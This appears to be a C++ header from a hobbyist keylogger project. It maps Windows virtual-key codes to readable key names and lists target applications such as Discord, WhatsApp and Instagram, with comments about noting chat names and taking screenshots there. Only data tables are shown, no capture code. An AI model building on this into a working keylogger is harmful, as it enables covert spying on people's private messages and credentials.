...
#ifndef KEYCONSTANTS_H //IF NOT DEFINED it will only include this particular header once so no duplicate includes
#define KEYCONSTANTS_H

//write between the two
#include <map> //exclusive to C++ 11 new type, comparable to a hash table or dictionary (more or less)
#include <string>
#include <vector>

class KeyPair
{
    public: //public all other classes have access to this variable/constant
        KeyPair(const std::string &vk = "", const std::string &name = "") : VKName (vk), //constructor, with optional arguments, represent our pairs
                                                                            Name (name)
                                                                            { }//empty body
        std::string VKName; //virtual keyname (not user friendly) machine level
        std::string Name; //user friendly name

};

class Keys //store a map of keys get from a system and translate it to human friend names
{
    public:
        static std::map<int, KeyPair> KEYS; //static array
        static std::map<std::string, std::string> Tags;
};

std::map<std::string, std::string> Keys::Tags = { //tags? ---*[tag1, tag2, tag3]*--- <- first header , ending headers will be (----------)
    {"discord", "Discord"}, //+ the chat name #sha_turf - Discord
    {"whatsapp", "WhatsApp"},
    {"youtube", "YouTube"},
    {"google chrome", "Google Chrome"},
    {"instagram", "Instagram]"}, //take screenshot here //double click screenshot
...
std::map<int, KeyPair> Keys::KEYS = { //defining the map and initializing the array
    {0xC1, {"[VK_ABNT_C1]", "[Abnt C1]"}}, //{how system registers a key (hex-decimal), system name for the key, our name for that key}
